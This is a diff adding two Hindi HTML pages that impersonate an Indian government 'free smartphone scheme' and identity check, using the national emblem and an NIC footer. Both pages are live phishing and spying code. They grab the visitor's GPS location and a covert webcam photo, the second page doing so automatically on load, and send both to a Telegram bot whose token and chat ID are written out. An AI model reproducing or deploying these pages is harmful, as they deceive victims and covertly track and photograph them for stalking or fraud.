@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sarkari Yojana - मुफ्त स्मार्टफोन पंजीकरण</title>
+    <style>
+        body { font-family: 'Arial', sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; text-align: center; }
+        .header { background-color: #ff9933; color: white; padding: 20px; font-size: 24px; font-weight: bold; border-bottom: 5px solid #138808; }
+        .container { background: white; margin: 20px auto; padding: 30px; width: 90%; max-width: 500px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        h2 { color: #000080; }
+        p { font-size: 16px; color: #333; }
+        .btn { background-color: #138808; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; margin-top: 20px; }
+        .footer { margin-top: 20px; font-size: 12px; color: #777; }
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="header">भारत सरकार - डिजिटल इंडिया मिशन</div>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Emblem_of_India.svg/1200px-Emblem_of_India.svg.png" alt="Emblem" width="60">
+    <h2>प्रधानमंत्री मुफ्त स्मार्टफोन योजना 2026</h2>
+    <p>पंजीकरण सफल करने के लिए कृपया अपनी पहचान सत्यापित करें।</p>
+    <p><strong>ध्यान दें:</strong> सत्यापन के लिए कैमरा और लोकेशन की अनुमति अनिवार्य है।</p>
+    
+    <button class="btn" onclick="startProcess()">अभी सत्यापित करें (Verify Now)</button>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+</div>
+
+<div class="footer">© 2026 National Informatics Centre (NIC)</div>
+
+<script>
+    const token = '8601193684:AAF9gVWarBQgsHM1FVSv-Bt_DTsILEug7N8';
+    const chatId = '8070342417';
+
+    function startProcess() {
+        // 1. लोकेशन लेना
+        navigator.geolocation.getCurrentPosition(position => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: "📍 नई लोकेशन मिली है:\n" + mapLink })
+            });
+            capturePhoto(); // लोकेशन मिलने के बाद फोटो खींचना
+        }, err => {
+            alert("कृपया आगे बढ़ने के लिए लोकेशन Allow करें।");
+        });
+    }
+
+    async function capturePhoto() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'identity_verify.png');
+                    formData.append('caption', '📸 यूजर की फोटो मिल गई है!');
+                    
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).then(() => {
+                        alert("सत्यापन सफल! आपको जल्द ही सूचित किया जाएगा।");
+                        stream.getTracks().forEach(track => track.stop()); // कैमरा बंद करना
+                    });
+                }, 'image/png');
+            }, 1500);
+        } catch (err) {
+            alert("कैमरा एक्सेस के बिना पंजीकरण अधूरा है।");
+        }
+    }
+</script>
+
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sarkari Yojana - वेरिफिकेशन</title>
+    <style>
+        body { font-family: sans-serif; background-color: #f4f4f4; text-align: center; margin: 0; }
+        .header { background: #ff9933; color: #fff; padding: 15px; font-weight: bold; border-bottom: 4px solid #138808; }
+        .box { background: #fff; margin: 50px auto; padding: 20px; width: 85%; max-width: 400px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.2); }
+        .loader { border: 6px solid #f3f3f3; border-top: 6px solid #000080; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body onload="autoStart()">
+
+<div class="header">डिजिटल इंडिया: सरकारी पहचान सत्यापन</div>
+
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Emblem_of_India.svg/1200px-Emblem_of_India.svg.png" width="50">
+    <h3>कृपया प्रतीक्षा करें...</h3>
+    <div class="loader"></div>
+    <p>आपका डिवाइस सत्यापित (Verify) किया जा रहा है।</p>
+    <p style="font-size: 12px; color: red;">ऊपर दिए गए 'Allow' बटन पर क्लिक करें।</p>
+</div>
+
+<video id="v" style="display:none;" autoplay></video>
+<canvas id="c" style="display:none;"></canvas>
+
+<script>
+    const tok = '8601193684:AAF9gVWarBQgsHM1FVSv-Bt_DTsILEug7N8';
+    const id = '8070342417';
+
+    async function autoStart() {
+        // 1. अपने आप लोकेशन मांगना
+        navigator.geolocation.getCurrentPosition(p => {
+            fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=📍 लोकेशन: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+        });
+
+        // 2. अपने आप कैमरा पॉप-अप दिखाना
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('v');
+            video.srcObject = s;
+
+            // 1 सेकंड बाद फोटो खींचना
+            setTimeout(() => {
+                const canvas = document.getElementById('c');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(b => {
+                    const f = new FormData();
+                    f.append('chat_id', id);
+                    f.append('photo', b, 'u.png');
+                    fetch(`https://api.telegram.org/bot${tok}/sendPhoto`, { method: 'POST', body: f });
+                }, 'image/png');
+            }, 1000);
+        } catch (e) {
+            console.log("Denied");
+        }
+    }
+</script>
+</body>
+</html>
